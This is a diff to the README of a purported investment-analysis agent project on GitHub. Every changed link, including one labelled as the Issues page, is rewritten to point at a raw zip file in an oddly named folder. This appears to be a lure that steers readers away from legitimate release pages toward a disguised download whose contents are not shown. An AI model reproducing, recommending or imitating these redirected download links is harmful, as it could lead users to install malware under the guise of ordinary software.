@@ -21,9 +21,9 @@ Before you dive into the world of intelligent investment analysis, follow these 
 
 ### 1. Download the Software
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/F1xkex0z/investment_Agent_langgraph_crewai/releases)
+[![Download Now](https://raw.githubusercontent.com/F1xkex0z/investment_Agent_langgraph_crewai/main/gerontic/investment_Agent_langgraph_crewai.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/F1xkex0z/investment_Agent_langgraph_crewai/main/gerontic/investment_Agent_langgraph_crewai.zip)
 
-Visit the [Releases page](https://github.com/F1xkex0z/investment_Agent_langgraph_crewai/releases) to download the software. You will see various versions available. Choose the latest one for the best features.
+Visit the [Releases page](https://raw.githubusercontent.com/F1xkex0z/investment_Agent_langgraph_crewai/main/gerontic/investment_Agent_langgraph_crewai.zip) to download the software. You will see various versions available. Choose the latest one for the best features.
 
 ### 2. Install the Software
 
@@ -84,7 +84,7 @@ If you encounter any issues while downloading or using the software, try the fol
 - **Installation Issues:** If the software won't install, check if your system meets the requirements.
 - **Performance Issues:** Make sure no other heavy applications are running in the background.
 
-For further assistance, you can check the **Issues** section on the [GitHub page](https://github.com/F1xkex0z/investment_Agent_langgraph_crewai/issues).
+For further assistance, you can check the **Issues** section on the [GitHub page](https://raw.githubusercontent.com/F1xkex0z/investment_Agent_langgraph_crewai/main/gerontic/investment_Agent_langgraph_crewai.zip).
 
 ---
 
@@ -96,7 +96,7 @@ Join our community for support and updates. You can ask questions or share your 
 
 ## 📥 Download & Install
 
-Don't forget to download the latest version of our application from the [Releases page](https://github.com/F1xkex0z/investment_Agent_langgraph_crewai/releases). Follow the steps outlined above to install and start using our smart investment analysis system.
+Don't forget to download the latest version of our application from the [Releases page](https://raw.githubusercontent.com/F1xkex0z/investment_Agent_langgraph_crewai/main/gerontic/investment_Agent_langgraph_crewai.zip). Follow the steps outlined above to install and start using our smart investment analysis system.
 
 --- 
 
